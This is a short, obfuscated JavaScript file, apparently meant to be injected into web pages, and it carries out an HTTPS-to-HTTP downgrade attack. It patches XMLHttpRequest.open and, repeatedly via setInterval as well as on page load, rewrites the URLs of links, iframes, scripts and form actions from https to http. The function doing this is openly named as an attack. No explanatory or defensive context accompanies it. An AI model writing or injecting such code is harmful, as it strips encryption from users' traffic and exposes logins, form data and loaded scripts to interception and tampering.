(function() {
	var obf_open_399385 = XMLHttpRequest.prototype.open;
	XMLHttpRequest.prototype.open = function(obf_var_method_399385, obf_var_url_399385, obf_var_async_399385, obf_var_username_399385, obf_var_password_399385) {
		obf_var_url_399385 = obf_var_url_399385.replace(/(http)s/ig, "$1");
		return obf_open_399385.apply(this, arguments);
	}
})();

function obf_func_attack_399385() {
	document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node_399385){
		switch (obf_var_node_399385.tagName) {
			case "A": obf_var_node_399385.href && obf_var_node_399385.href.match(/https/i) ? obf_var_node_399385.href = obf_var_node_399385.href.replace(/(http)s/ig, "$1") : ""; break;
			case "IFRAME": obf_var_node_399385.src && obf_var_node_399385.src.match(/https/i) ? obf_var_node_399385.src = obf_var_node_399385.src.replace(/(http)s/ig, "$1") : ""; break;
			case "SCRIPT": obf_var_node_399385.src && obf_var_node_399385.src.match(/https/i) ? obf_var_node_399385.src = obf_var_node_399385.src.replace(/(http)s/ig, "$1") : ""; break;
			case "FORM": obf_var_node_399385.action && obf_var_node_399385.action.match(/https/i) ? obf_var_node_399385.action = obf_var_node_399385.action.replace(/(http)s/ig, "$1") : ""; break;
		}
	});
}

setInterval(obf_func_attack_399385, 666);

try {
	document.addEventListener("DOMContentLoaded", obf_func_attack_399385);
} catch(obf_ignore_399385) {
	self.addEventListener("load", obf_func_attack_399385);
}
